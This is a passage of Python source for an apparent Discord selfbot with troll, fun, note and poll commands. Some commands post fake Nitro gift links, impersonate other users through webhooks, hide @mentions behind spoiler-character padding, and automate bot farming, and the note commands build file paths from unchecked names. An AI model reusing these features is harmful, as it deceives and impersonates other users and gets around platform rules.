				embed = discord.Embed(title=titlevar(), url=titleurlvar(), description=f"No one was getting copied", color=hexcolorvar())
				embed.set_thumbnail(url=imagevar())
				embed.set_footer(text=footervar(), icon_url=footer_iconurlvar())
				embed.set_author(name=authorvar(), url=authorurlvar(), icon_url=author_iconurlvar())
				embed.set_image(url=largeimagevar())
				sent = await luna.send(embed=embed)
				await asyncio.sleep(deletetimer())
				await sent.delete()
			return

		if mode() == 2:
			sent = await luna.send(f"```ini\n[ {titlevar()} ]\n\nStopped copying {copycat}\n\n[ {footervar()} ]```")
			copycat = None
			await asyncio.sleep(deletetimer())
			await sent.delete()
		else:
			embed = discord.Embed(title=titlevar(), url=titleurlvar(), description=f"Stopped copying {copycat}", color=hexcolorvar())
			embed.set_thumbnail(url=imagevar())
			embed.set_footer(text=footervar(), icon_url=footer_iconurlvar())
			embed.set_author(name=authorvar(), url=authorurlvar(), icon_url=author_iconurlvar())
			embed.set_image(url=largeimagevar())
			sent = await luna.send(embed=embed)
			copycat = None
			await asyncio.sleep(deletetimer())
			await sent.delete()

	@commands.command(name = "fakenitro",
					usage="[amount]",
					description = "Generate fake nitro links")
	async def fakenitro(self, luna, amount: int = None):
		await luna.message.delete()
		try:
			if amount is None:
				await luna.send(Nitro())
			else:
				for each in range(0, amount):
					await luna.send(Nitro())
		except Exception as e:
			await luna.send(f"Error: {e}")

	@commands.command(name = "trollnitro",
					usage="",
					description = "Send a used nitro link")
	async def trollnitro(self, luna):
		await luna.message.delete()
		await luna.send("https://discord.gift/6PWNmA6NTuRkejaP")

	@commands.command(name = "mreact",
					usage="",
					description = "Mass reacts on last message")
	async def mreact(self, luna):
	    await luna.message.delete()
	    messages = await luna.message.channel.history(limit=1).flatten()
	    for message in messages:
	        await message.add_reaction("😂")
	        await message.add_reaction("😡")
	        await message.add_reaction("🤯")
	        await message.add_reaction("👍")
	        await message.add_reaction("👎")
	        await message.add_reaction("💯")
	        await message.add_reaction("🍑")
	        await message.add_reaction("❗")
	        await message.add_reaction("🥳")
	        await message.add_reaction("👏")
	        await message.add_reaction("🔞")
	        await message.add_reaction("🇫")
	        await message.add_reaction("🥇")
	        await message.add_reaction("🤔")
	        await message.add_reaction("💀")
	        await message.add_reaction("❤️")

	@commands.command(name = "fakenuke",
					usage="",
					description = "Fakenuke")
	async def fakenuke(self, luna):
		await luna.message.delete()
		message = await luna.send(content=':bomb: :bomb: Nuking this server in 5 :rotating_light:')
		await asyncio.sleep(1)
		await message.edit(content='0')
		await asyncio.sleep(1)
		await message.edit(content='1')
		await asyncio.sleep(1)
		await message.edit(content='2')
		await asyncio.sleep(1)
		await message.edit(content='3')
		await asyncio.sleep(1)
		await message.edit(content='4')
		await asyncio.sleep(1)
		await message.edit(content='This server will be destoyed now')
		await asyncio.sleep(1)
		await message.edit(content=':bomb:')
		await asyncio.sleep(1)
		await message.edit(content=':boom:')
		await asyncio.sleep(1)
		await message.edit(content='Shouldn\'t have even created it ig')
		await asyncio.sleep(1)
		await message.edit(content=':bomb: :bomb:')
		await asyncio.sleep(1)
		await message.edit(content=':boom: :boom:')
		await asyncio.sleep(1)
		await message.edit(content='You will wish you never lived to know about discord')
		await asyncio.sleep(1)
		await message.edit(content=':bomb: :bomb: :bomb:')
		await asyncio.sleep(1)
		await message.edit(content=':boom: :boom: :boom:')
		await asyncio.sleep(1)
		await message.edit(content='There it comes...')
		await asyncio.sleep(1)
		await message.edit(content='https://giphy.com/gifs/rick-roll-lgcUUCXgC8mEo')

bot.add_cog(TrollCog(bot))

class FunCog(commands.Cog, name="Fun commands"):
	def __init__(self, bot:commands.bot):
		self.bot = bot

	@commands.command(name = "impersonate",
					usage="<@member> <message>",
					description = "Make them send your message")
	async def impersonate(self, luna, user: discord.User, *, message: str):
		await luna.message.delete()
		webhook = await luna.channel.create_webhook(name=user.name)
		await webhook.send(message, username=user.name, avatar_url=user.avatar_url)
		await webhook.delete()

	@commands.command(name = "shoot",
					usage="<@member>",
					description = "Shoot up someone")
	async def shoot(self, luna, user: discord.Member = None):
		await luna.message.delete()
		if user == None:
			embed = discord.Embed(title="Error", url=titleurlvar(), description=f"Who do you want to shoot up? Please mention someone.", color=hexcolorvar())
			embed.set_thumbnail(url=imagevar())
			embed.set_footer(text=footervar(), icon_url=footer_iconurlvar())
			embed.set_author(name=authorvar(), url=authorurlvar(), icon_url=author_iconurlvar())
			embed.set_image(url=largeimagevar())
			await luna.send(embed=embed)
			return
		else:
			embed = discord.Embed(description=f"{user.mention} got shot up!", color=hexcolorvar())
			embed.set_footer(text=footervar(), icon_url=footer_iconurlvar())
			embed.set_author(name=authorvar(), url=authorurlvar(), icon_url=author_iconurlvar())
			embed.set_image(url="https://media1.tenor.com/images/cfb7817a23645120d4baba2dcb9205e0/tenor.gif")
			await luna.send(embed=embed)

	@commands.command(name = "feed",
					usage="<@member>",
					description = "Feed someone")
	async def feed(self, luna, user: discord.Member = None):
		await luna.message.delete()
		if user == None:
			embed = discord.Embed(title="Error", url=titleurlvar(), description=f"Who do you want to feed? Please mention someone.", color=hexcolorvar())
			embed.set_thumbnail(url=imagevar())
			embed.set_footer(text=footervar(), icon_url=footer_iconurlvar())
			embed.set_author(name=authorvar(), url=authorurlvar(), icon_url=author_iconurlvar())
			embed.set_image(url=largeimagevar())
			await luna.send(embed=embed)
			return
		else:
			r = requests.get("https://nekos.life/api/v2/img/feed").json()
			embed = discord.Embed(description=f"{luna.author.mention} feeds {user.mention}", color=hexcolorvar())
			embed.set_footer(text=footervar(), icon_url=footer_iconurlvar())
			embed.set_author(name=authorvar(), url=authorurlvar(), icon_url=author_iconurlvar())
			embed.set_image(url=str(r['url']))
			await luna.send(embed=embed)

	@commands.command(name = "kiss",
					usage="<@member>",
					description = "Kiss someone")
	async def kiss(self, luna, user: discord.Member = None):
		await luna.message.delete()
		if user == None:
			embed = discord.Embed(title="Error", url=titleurlvar(), description=f"Who do you want to kiss? Please mention someone.", color=hexcolorvar())
			embed.set_thumbnail(url=imagevar())
			embed.set_footer(text=footervar(), icon_url=footer_iconurlvar())
			embed.set_author(name=authorvar(), url=authorurlvar(), icon_url=author_iconurlvar())
			embed.set_image(url=largeimagevar())
			await luna.send(embed=embed)
			return
		else:
			r = requests.get("https://nekos.life/api/v2/img/kiss").json()
			embed = discord.Embed(description=f"{luna.author.mention} kisses {user.mention}", color=hexcolorvar())
			embed.set_footer(text=footervar(), icon_url=footer_iconurlvar())
			embed.set_author(name=authorvar(), url=authorurlvar(), icon_url=author_iconurlvar())
			embed.set_image(url=str(r['url']))
			await luna.send(embed=embed)

	@commands.command(name = "hug",
					usage="<@member>",
					description = "Hug someone")
	async def hug(self, luna, user: discord.Member = None):
		await luna.message.delete()
		if user == None:
			embed = discord.Embed(title="Error", url=titleurlvar(), description=f"Who do you want to hug? Please mention someone.", color=hexcolorvar())
			embed.set_thumbnail(url=imagevar())
			embed.set_footer(text=footervar(), icon_url=footer_iconurlvar())
			embed.set_author(name=authorvar(), url=authorurlvar(), icon_url=author_iconurlvar())
			embed.set_image(url=largeimagevar())
			await luna.send(embed=embed)
			return
		else:
			r = requests.get("https://nekos.life/api/v2/img/hug").json()
			embed = discord.Embed(description=f"{luna.author.mention} hugs {user.mention}", color=hexcolorvar())
			embed.set_footer(text=footervar(), icon_url=footer_iconurlvar())
			embed.set_author(name=authorvar(), url=authorurlvar(), icon_url=author_iconurlvar())
			embed.set_image(url=str(r['url']))
			await luna.send(embed=embed)

	@commands.command(name = "pat",
					usage="<@member>",
					description = "Pat someone")
	async def pat(self, luna, user: discord.Member = None):
		await luna.message.delete()
		if user == None:
			embed = discord.Embed(title="Error", url=titleurlvar(), description=f"Who do you want to pat? Please mention someone.", color=hexcolorvar())
			embed.set_thumbnail(url=imagevar())
			embed.set_footer(text=footervar(), icon_url=footer_iconurlvar())
			embed.set_author(name=authorvar(), url=authorurlvar(), icon_url=author_iconurlvar())
			embed.set_image(url=largeimagevar())
			await luna.send(embed=embed)
			return
		else:
			r = requests.get("https://nekos.life/api/v2/img/pat").json()
			embed = discord.Embed(description=f"{luna.author.mention} pats {user.mention}", color=hexcolorvar())
			embed.set_footer(text=footervar(), icon_url=footer_iconurlvar())
			embed.set_author(name=authorvar(), url=authorurlvar(), icon_url=author_iconurlvar())
			embed.set_image(url=str(r['url']))

	@commands.command(name = "slap",
					usage="<@member>",
					description = "Slap someone")
	async def slap(self, luna, user: discord.Member = None):
		await luna.message.delete()
		if user == None:
			embed = discord.Embed(title="Error", url=titleurlvar(), description=f"Who do you want to slap? Please mention someone.", color=hexcolorvar())
			embed.set_thumbnail(url=imagevar())
			embed.set_footer(text=footervar(), icon_url=footer_iconurlvar())
			embed.set_author(name=authorvar(), url=authorurlvar(), icon_url=author_iconurlvar())
			embed.set_image(url=largeimagevar())
			await luna.send(embed=embed)
			return
		else:
			r = requests.get("https://nekos.life/api/v2/img/slap").json()
			embed = discord.Embed(description=f"{luna.author.mention} slaps {user.mention}", color=hexcolorvar())
			embed.set_footer(text=footervar(), icon_url=footer_iconurlvar())
			embed.set_author(name=authorvar(), url=authorurlvar(), icon_url=author_iconurlvar())
			embed.set_image(url=str(r['url']))

	@commands.command(name = "tickle",
					usage="<@member>",
					description = "Tickle someone")
	async def tickle(self, luna, user: discord.Member = None):
		await luna.message.delete()
		if user == None:
			embed = discord.Embed(title="Error", url=titleurlvar(), description=f"Who do you want to tickle? Please mention someone.", color=hexcolorvar())
			embed.set_thumbnail(url=imagevar())
			embed.set_footer(text=footervar(), icon_url=footer_iconurlvar())
			embed.set_author(name=authorvar(), url=authorurlvar(), icon_url=author_iconurlvar())
			embed.set_image(url=largeimagevar())
			await luna.send(embed=embed)
			return
		else:
			r = requests.get("https://nekos.life/api/v2/img/tickle").json()
			embed = discord.Embed(description=f"{luna.author.mention} tickles {user.mention}", color=hexcolorvar())
			embed.set_footer(text=footervar(), icon_url=footer_iconurlvar())
			embed.set_author(name=authorvar(), url=authorurlvar(), icon_url=author_iconurlvar())
			embed.set_image(url=str(r['url']))

	@commands.command(name = "fml",
					usage="",
					description = "Fuck my life")
	async def fml(self, luna):
		await luna.message.delete()
		request = requests.get(f'https://react.flawcra.cc/api/generation.php?type=fml')
		data = request.json()
		text = data['text']
		embed = discord.Embed(title=titlevar(), url=titleurlvar(), description=f'{text}', color=hexcolorvar())
		embed.set_footer(text=footervar(), icon_url=footer_iconurlvar())
		embed.set_author(name=authorvar(), url=authorurlvar(), icon_url=author_iconurlvar())
		embed.set_image(url=largeimagevar())
		await send(luna, embed)
        
	@commands.command(name = "gay",
					usage="[@member]",
					description = "Gay rate somebody")
	async def gay(self, luna, user: discord.Member = None):
		await luna.message.delete()
		if user is None:
			user = luna.author
		number = random.randint(1, 100)
		embed = discord.Embed(title=f"{user}'s Gay Rate", description=f"{number}% Gay 🏳️‍🌈", color=hexcolorvar())
		embed.set_thumbnail(url=imagevar())
		embed.set_footer(text=footervar(), icon_url=footer_iconurlvar())
		embed.set_author(name=authorvar(), url=authorurlvar(), icon_url=author_iconurlvar())
		embed.set_image(url=largeimagevar())
		await send(luna, embed)

	@commands.command(name = "iq",
					usage="[@member]",
					description = "Somebody's IQ")
	async def iq(self, luna, user: discord.Member = None):
		await luna.message.delete()
		if user is None:
			user = luna.author
		number = random.randint(1, 120)
		embed = discord.Embed(title=f"{user}'s IQ", description=f"{number}", color=hexcolorvar())
		embed.set_thumbnail(url=imagevar())
		embed.set_footer(text=footervar(), icon_url=footer_iconurlvar())
		embed.set_author(name=authorvar(), url=authorurlvar(), icon_url=author_iconurlvar())
		embed.set_image(url=largeimagevar())
		await send(luna, embed)

	@commands.command(name = "love",
					usage="<@member> [@member]",
					description = "Love rate")
	async def love(self, luna, user1: discord.Member, user2: discord.Member = None):
		await luna.message.delete()
		if user2 is None:
			user2 = luna.author
		number = random.randint(1, 100)
		breakup = random.randint(1, 100)
		kids = random.randint(1, 100)
		embed = discord.Embed(title=f"{user1} ❤️ {user2}", description=f"{number}% fitted!\n{kids}% chance of them having kids!\n{breakup}% chance of them breaking up!", color=hexcolorvar())
		embed.set_thumbnail(url=imagevar())
		embed.set_footer(text=footervar(), icon_url=footer_iconurlvar())
		embed.set_author(name=authorvar(), url=authorurlvar(), icon_url=author_iconurlvar())
		embed.set_image(url=largeimagevar())
		await send(luna, embed)

	@commands.command(name = "coronatest",
					usage="<@member>",
					description = "Test somebody for Corona")
	async def coronatest(self, luna, user: discord.Member = None):
		await luna.message.delete()

		if user is None:
			member = luna.author
		else:
			member = user
		random.seed((member.id * 6) / 2)
		percent = random.randint(0, 100)
		embed = discord.Embed(title=f"{user}'s Corona Test", description=f'```\n{percent}% positive!\n``````\nResult\n\nOverall » {"Positive" if (percent > 50) else "Negative"}```', color=hexcolorvar())
		embed.set_thumbnail(url=imagevar())
		embed.set_footer(text=footervar(), icon_url=footer_iconurlvar())
		embed.set_author(name=authorvar(), url=authorurlvar(), icon_url=author_iconurlvar())
		embed.set_image(url=largeimagevar())
		await send(luna, embed)

	@commands.command(name = "8ball",
					usage="<question>",
					description = "Ask 8 Ball!")
	async def _8ball(self, luna, *, question:str):
		await luna.message.delete()
		responses = [
			'That is a resounding no',
			'It is not looking likely',
			'Too hard to tell',
			'It is quite possible',
			'That is a definite yes!',
			'Maybe',
			'There is a good chance'
		]
		answer = random.choice(responses)
		embed = discord.Embed(title="8 Ball", description=f"Question: {question}\n\nAnswer: {answer}", color=hexcolorvar())
		embed.set_thumbnail(url="https://www.horoscope.com/images-US/games/game-magic-8-ball-no-text.png")
		embed.set_footer(text=footervar(), icon_url=footer_iconurlvar())
		embed.set_author(name=authorvar(), url=authorurlvar(), icon_url=author_iconurlvar())
		embed.set_image(url=largeimagevar())
		await send(luna, embed)

	@commands.command(name = "slot",
					usage="",
					aliases=['slots'],
					description = "Play slots")
	async def slot(self, luna):
		await luna.message.delete()
		emojis = "🍎🍊🍐🍋🍉🍇🍓🍒"
		a = random.choice(emojis)
		b = random.choice(emojis)
		c = random.choice(emojis)
		slotmachine = f"**------------------\n| {a} | {b} | {c} |\n------------------\n\n{luna.author.name}**,"
		if (a == b == c):
			embed = discord.Embed(title="Slot Machine", description=f"{slotmachine} All matchings, you won!", color=hexcolorvar())
			embed.set_footer(text=footervar(), icon_url=footer_iconurlvar())
			embed.set_author(name=authorvar(), url=authorurlvar(), icon_url=author_iconurlvar())
			await send(luna, embed)
		elif (a == b) or (a == c) or (b == c):
			embed = discord.Embed(title="Slot Machine", description=f"{slotmachine} 2 in a row, you won!", color=hexcolorvar())
			embed.set_footer(text=footervar(), icon_url=footer_iconurlvar())
			embed.set_author(name=authorvar(), url=authorurlvar(), icon_url=author_iconurlvar())
			await send(luna, embed)
		else:
			embed = discord.Embed(title="Slot Machine", description=f"{slotmachine} No match, you lost!", color=hexcolorvar())
			embed.set_footer(text=footervar(), icon_url=footer_iconurlvar())
			embed.set_author(name=authorvar(), url=authorurlvar(), icon_url=author_iconurlvar())
			await send(luna, embed)

	@commands.command(name = "dadjoke",
					usage="",
					description = "Dad jokes")
	async def dadjoke(self, luna):
		await luna.message.delete()
		request = requests.get(f'https://icanhazdadjoke.com/', headers={'accept': 'application/json'})
		data = request.json()
		joke = data['joke']
		embed = discord.Embed(title=titlevar(), url=titleurlvar(), description=f'{joke}', color=hexcolorvar())
		embed.set_footer(text=footervar(), icon_url=footer_iconurlvar())
		embed.set_author(name=authorvar(), url=authorurlvar(), icon_url=author_iconurlvar())
		embed.set_image(url=largeimagevar())
		await send(luna, embed)

	@commands.command(name = "joke",
					usage="",
					description = "Random jokes")
	async def dadjoke(self, luna):
		await luna.message.delete()
		request = requests.get(f'http://www.official-joke-api.appspot.com/random_joke')
		data = request.json()
		setup = data['setup']
		punchline = data['punchline']
		embed = discord.Embed(title=titlevar(), url=titleurlvar(), description=f'{setup}\n\n||{punchline}||', color=hexcolorvar())
		embed.set_footer(text=footervar(), icon_url=footer_iconurlvar())
		embed.set_author(name=authorvar(), url=authorurlvar(), icon_url=author_iconurlvar())
		embed.set_image(url=largeimagevar())
		await send(luna, embed)

	@commands.command(name = "coinflip",
					usage="",
					description = "Flip a coin")
	async def coinflip(self, luna):
		await luna.message.delete()
		lista = ['head', 'tails']
		coin = random.choice(lista)
		try:
			if coin == 'head':
				embed = discord.Embed(title="Head", color=hexcolorvar())
				embed.set_footer(text=footervar(), icon_url=footer_iconurlvar())
				embed.set_thumbnail(url="https://webstockreview.net/images/coin-clipart-dime-6.png")
				embed.set_author(name=authorvar(), url=authorurlvar(), icon_url=author_iconurlvar())
				await send(luna, embed)
			else:
				embed = discord.Embed(title="Tails", color=hexcolorvar())
				embed.set_footer(text=footervar(), icon_url=footer_iconurlvar())
				embed.set_thumbnail(url="https://www.nicepng.com/png/full/146-1464848_quarter-tail-png-tails-on-a-coin.png")
				embed.set_author(name=authorvar(), url=authorurlvar(), icon_url=author_iconurlvar())
				await send(luna, embed)
		except discord.HTTPException:
			if coin == 'head':
				await luna.send("```\nCoinflip » Head```")
			else:
				await luna.send("```\nCoinflip » Tails```")

	@commands.command(name = "prntsc",
						usage="",
						description = "Send a random prnt.sc")
	async def prntsc(self, luna):
		await luna.message.delete()
		await luna.send(Randprntsc())

	@commands.command(name = "farmer",
						usage="",
						description = "Dank Memer farmer")
	async def farmer(self, luna):
		await luna.message.delete()
		global farming
		farming = True
		while farming:
			await luna.send("pls beg")
			await asyncio.sleep(3)
			await luna.send("pls deposit all")
			await asyncio.sleep(42)

	@commands.command(name = "afarmer",
						usage="",
						description = "Advanced Dank Memer farmer")
	async def afarmer(self, luna):
		await luna.message.delete()
		global farming
		farming = True
		while farming:
			await luna.send("pls beg")
			await asyncio.sleep(3)
			await luna.send("pls deposit all")
			await asyncio.sleep(3)
			await luna.send("pls postmeme")
			await asyncio.sleep(3)
			await luna.send("n")
			await asyncio.sleep(3)
			await luna.send("pls fish")
			await asyncio.sleep(33)


	@commands.command(name = "stopfarmer",
						usage="",
						description = "Stops the Dank Memer farmer")
	async def stopfarmer(self, luna):
		await luna.message.delete()
		global farming
		farming = False

bot.add_cog(FunCog(bot))

class ToolsCog(commands.Cog, name="Tools commands"):
	def __init__(self, bot:commands.bot):
		self.bot = bot

	@commands.command(name = "note",
					aliases=['newnote'],
					usage="<name> <text>",
					description = "Create a note")
	async def note(self, luna, name:str, *, text:str):
		await luna.message.delete()

		if not os.path.exists('data/notes'):
			os.makedirs('data/notes')

		if os.path.exists(f"data/notes/{name}.txt"):
			if errorlog() == "console":
				printerror(f"A note already exists with the name » {bcolors.LIGHTMAGENTA}{name}{bcolors.RESET}")
			else:
				embed = discord.Embed(title="Error", url=titleurlvar(), description=f"```\nA note already exists with the name » {name}```", color=0xff0000)
				embed.set_thumbnail(url=imagevar())
				embed.set_footer(text=footervar(), icon_url=footer_iconurlvar())
				embed.set_author(name=authorvar(), url=authorurlvar(), icon_url=author_iconurlvar())
				embed.set_image(url=largeimagevar())
				await send(luna, embed)
		else:
			file = open(f"data/notes/{name}.txt", "w")
			file.write(str(text))
			file.close()
			printmessage(f"Created note » {bcolors.LIGHTMAGENTA}{name}{bcolors.RESET}")
			embed = discord.Embed(title=titlevar(), url=titleurlvar(), description=f"```\nCreated note » {name}```", color=hexcolorvar())
			embed.set_thumbnail(url=imagevar())
			embed.set_footer(text=footervar(), icon_url=footer_iconurlvar())
			embed.set_author(name=authorvar(), url=authorurlvar(), icon_url=author_iconurlvar())
			embed.set_image(url=largeimagevar())
			await send(luna, embed)

	@commands.command(name = "editnote",
					usage="<name> <name>",
					description = "Edit the note name")
	async def editnote(self, luna, name:str, themename:str):
		await luna.message.delete()

		if not os.path.exists('data/notes'):
			os.makedirs('data/notes')

		if not os.path.exists(f"data/notes/{name}.txt"):
			if errorlog() == "console":
				printerror(f"No note exists with the name » {bcolors.LIGHTMAGENTA}{name}{bcolors.RESET}")
			else:
				embed = discord.Embed(title="Error", url=titleurlvar(), description=f"```\nNo note exists with the name » {name}```", color=0xff0000)
				embed.set_thumbnail(url=imagevar())
				embed.set_footer(text=footervar(), icon_url=footer_iconurlvar())
				embed.set_author(name=authorvar(), url=authorurlvar(), icon_url=author_iconurlvar())
				embed.set_image(url=largeimagevar())
				await send(luna, embed)
		else:
			os.rename(f"data/notes/{name}.txt",f"data/notes/{themename}.txt")
			printmessage(f"Edited note {name} to » {bcolors.LIGHTMAGENTA}{themename}{bcolors.RESET}")
			embed = discord.Embed(title=titlevar(), url=titleurlvar(), description=f"```\nEdited note {name} to » {themename}```", color=hexcolorvar())
			embed.set_thumbnail(url=imagevar())
			embed.set_footer(text=footervar(), icon_url=footer_iconurlvar())
			embed.set_author(name=authorvar(), url=authorurlvar(), icon_url=author_iconurlvar())
			embed.set_image(url=largeimagevar())
			await send(luna, embed)

	@commands.command(name = "delnote",
					usage="<name>",
					description = "Delete a note")
	async def delnote(self, luna, name:str):
		await luna.message.delete()

		if not os.path.exists('data/notes'):
			os.makedirs('data/notes')

		if os.path.exists(f"data/notes/{name}" + ".txt"):
			os.remove(f"data/notes/{name}" + ".txt")
			printmessage(f"Deleted note » {bcolors.LIGHTMAGENTA}{name}{bcolors.RESET}")

			embed = discord.Embed(title=titlevar(), url=titleurlvar(), description=f"```\nDeleted note » {name}```", color=hexcolorvar())
			embed.set_thumbnail(url=imagevar())
			embed.set_footer(text=footervar(), icon_url=footer_iconurlvar())
			embed.set_author(name=authorvar(), url=authorurlvar(), icon_url=author_iconurlvar())
			embed.set_image(url=largeimagevar())
			await send(luna, embed)
		else:
			if errorlog() == "console":
				printerror(f"There is no note called » {bcolors.LIGHTMAGENTA}{name}{bcolors.RESET}")
			else:
				embed = discord.Embed(title="Error", url=titleurlvar(), description=f"```\nThere is no note called » {name}```", color=0xff0000)
				embed.set_thumbnail(url=imagevar())
				embed.set_footer(text=footervar(), icon_url=footer_iconurlvar())
				embed.set_author(name=authorvar(), url=authorurlvar(), icon_url=author_iconurlvar())
				embed.set_image(url=largeimagevar())
				await send(luna, embed)

	@commands.command(name = "sendnote",
					usage="<name>",
					description = "Send the note")
	async def sendnote(self, luna, name:str):
		await luna.message.delete()

		if not os.path.exists('data/notes'):
			os.makedirs('data/notes')

		if not os.path.exists(f"data/notes/{name}.txt"):
			if errorlog() == "console":
				printerror(f"No note exists with the name » {bcolors.LIGHTMAGENTA}{name}{bcolors.RESET}")
			else:
				embed = discord.Embed(title="Error", url=titleurlvar(), description=f"```\nNo note exists with the name » {name}```", color=0xff0000)
				embed.set_thumbnail(url=imagevar())
				embed.set_footer(text=footervar(), icon_url=footer_iconurlvar())
				embed.set_author(name=authorvar(), url=authorurlvar(), icon_url=author_iconurlvar())
				embed.set_image(url=largeimagevar())
				await send(luna, embed)
		else:
			if name.endswith('.txt'):
				name = name[:-4]
			await luna.send(file=discord.File(f"data/notes/{name}.txt"))

	@commands.command(name = "shownote",
					usage="<name>",
					description = "Send the content of the note")
	async def shownote(self, luna, name:str):
		await luna.message.delete()

		if not os.path.exists('data/notes'):
			os.makedirs('data/notes')

		if not os.path.exists(f"data/notes/{name}.txt"):
			if errorlog() == "console":
				printerror(f"No note exists with the name » {bcolors.LIGHTMAGENTA}{name}{bcolors.RESET}")
			else:
				embed = discord.Embed(title="Error", url=titleurlvar(), description=f"```\nNo note exists with the name » {name}```", color=0xff0000)
				embed.set_thumbnail(url=imagevar())
				embed.set_footer(text=footervar(), icon_url=footer_iconurlvar())
				embed.set_author(name=authorvar(), url=authorurlvar(), icon_url=author_iconurlvar())
				embed.set_image(url=largeimagevar())
				await send(luna, embed)
		else:
			file = open(f"data/notes/{name}" + ".txt", "r")
			file_data = file.read()
			if file_data == "":
				if errorlog() == "console":
					printerror(f"The note is empty")
				else:
					embed = discord.Embed(title="Error", url=titleurlvar(), description=f"```\nThe note is empty```", color=0xff0000)
					embed.set_thumbnail(url=imagevar())
					embed.set_footer(text=footervar(), icon_url=footer_iconurlvar())
					embed.set_author(name=authorvar(), url=authorurlvar(), icon_url=author_iconurlvar())
					embed.set_image(url=largeimagevar())
					await send(luna, embed)
			else:
				embed = discord.Embed(title="Notes", description=f"```\nContent of {name}.txt ↴\n\n{str(file_data)}```", color=hexcolorvar())
				embed.set_thumbnail(url=imagevar())
				embed.set_footer(text=footervar(), icon_url=footer_iconurlvar())
				embed.set_author(name=authorvar(), url=authorurlvar(), icon_url=author_iconurlvar())
				embed.set_image(url=largeimagevar())
				await send(luna, embed)

	@commands.command(name = "notes",
					usage="",
					description = "Show all notes")
	async def notes(self, luna):
		await luna.message.delete()

		if not os.path.exists('data/notes'):
			os.makedirs('data/notes')

		path_to_text = 'data/notes/'
		text_files = [pos_txt for pos_txt in os.listdir(path_to_text) if pos_txt.endswith('.txt')]

		with open("config.json", "r") as f:
			config = json.load(f)
		prefix = config.get('prefix')

		if text_files == []:
			stringedit = "None"
		else:
			string = f"{text_files}"
			stringedit = string.replace(',', f"\n{prefix}shownote").replace("'", "").replace('[', f"{prefix}shownote ").replace(']', "").replace('.txt', "")

		embed = discord.Embed(title="Notes", description=f"{descriptionvar()}```\nNote control\n\n{prefix}note <name> <text> » Create a note\n{prefix}editnote <name> <name> » Edit note name\n{prefix}delnote <name>   » Delete a note\n{prefix}sendnote <name>  » Send the note\n``````\nAvailable notes\n\n{stringedit}```", color=hexcolorvar())
		embed.set_thumbnail(url=imagevar())
		embed.set_footer(text=footervar(), icon_url=footer_iconurlvar())
		embed.set_author(name=authorvar(), url=authorurlvar(), icon_url=author_iconurlvar())
		embed.set_image(url=largeimagevar())
		await send(luna, embed)

	@commands.command(name = "poll",
					usage="<question>",
					description = "Create a poll")
	async def poll(self, luna, *, question):
		await luna.message.delete()
		embed = discord.Embed(title=f"Poll", description=f"{question}", color=hexcolorvar())
		embed.set_thumbnail(url=imagevar())
		embed.set_footer(text=footervar(), icon_url=footer_iconurlvar())
		embed.set_author(name=authorvar(), url=authorurlvar(), icon_url=author_iconurlvar())
		embed.set_image(url=largeimagevar())
		message = await luna.send(embed=embed)
		await message.add_reaction('👍')
		await message.add_reaction('👎')

	@commands.command(name = "cpoll",
					usage="<option1> <option2> <question>",
					description = "Poll")
	async def cpoll(self, luna, option1, option2, *, poll):
		await luna.message.delete()
		embed = discord.Embed(title=f"Poll", description=f"{poll}\n\n🅰️ = {option1}\n🅱️ = {option2}", color=hexcolorvar())
		embed.set_thumbnail(url=imagevar())
		embed.set_footer(text=footervar(), icon_url=footer_iconurlvar())
		embed.set_author(name=authorvar(), url=authorurlvar(), icon_url=author_iconurlvar())
		embed.set_image(url=largeimagevar())
		message = await luna.send(embed=embed)
		await message.add_reaction('🅰️')
		await message.add_reaction('🅱️')

	@commands.command(name = "hiddenping",
					usage="<channel_id> <user_id> <message>",
					description = "Ping someone without showing @member")
	async def hiddenping(self, luna, channel_id: int, user_id, *, message):
		await luna.message.delete()

		if user_id == "@everyone" or user_id == "everyone":
			user = "@everyone"
		elif len(user_id) == 18:
			user = "<" + "@" + user_id + ">"
		elif len(user_id) == 19:
			user = "<" + user_id + ">"
		else:
			printerror("Invalid User!")

		cuser = await self.bot.fetch_user(user_id)
		cchannel = await self.bot.fetch_channel(channel_id)

		channel = self.bot.get_channel(channel_id)
		charTT = "||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||"
		await channel.send(message + charTT + user)

		embed = discord.Embed(title=f"Hidden Ping", description=f"```\nPing sent!\n\nChannel ID        » {channel_id}\nChannel Name      » {cchannel.name}\nUser Name         » {cuser.name}#{cuser.discriminator}\nUser ID           » {user_id}\nMessage           » {message}```", color=hexcolorvar())
		embed.set_thumbnail(url=imagevar())
		embed.set_footer(text=footervar(), icon_url=footer_iconurlvar())
		embed.set_author(name=authorvar(), url=authorurlvar(), icon_url=author_iconurlvar())
		embed.set_image(url=largeimagevar())
		await send(luna, embed)

	@commands.command(name = "hiddeneveryone",
					usage="<channel_id> <message>",
					description = "Ping everyone without showing @everyone")
	async def hiddeneveryone(self, luna, channel_id: int, *, message):
		await luna.message.delete()

		user = "@everyone"

		cchannel = await self.bot.fetch_channel(channel_id)

		channel = self.bot.get_channel(channel_id)
